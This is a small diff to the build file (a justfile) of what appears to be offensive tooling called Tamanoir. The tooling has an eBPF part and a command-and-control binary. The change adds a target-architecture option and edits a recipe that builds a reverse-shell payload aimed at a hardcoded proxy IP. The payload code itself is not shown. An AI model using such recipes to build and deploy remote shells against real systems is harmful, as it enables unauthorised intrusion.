@@ -5,6 +5,7 @@ _default:
 _build-ebpf:
     cd tamanoir-ebpf && cargo build  --release
 
+arch:="x86_64" # x86_64 , aarch64
 proxy_ip:="192.168.1.15"
 
 # Build Tamanoir
@@ -36,7 +37,7 @@ c2-run:
 
 # Rce build (run on c2 server)
 rce_build_reverse_shell :
-    ./target/release/tamanoir-c2  rce  build  -c ./assets/payloads/reverse-shell  -b "IP={{proxy_ip}} PORT=8082"
+    ./target/release/tamanoir-c2  rce  build  -c ./assets/payloads/reverse-shell  -b "IP={{proxy_ip}}" -t {{arch}}
 
 rce_build_hello :
     ./target/release/tamanoir-c2  rce  build  -c ./assets/payloads/hello
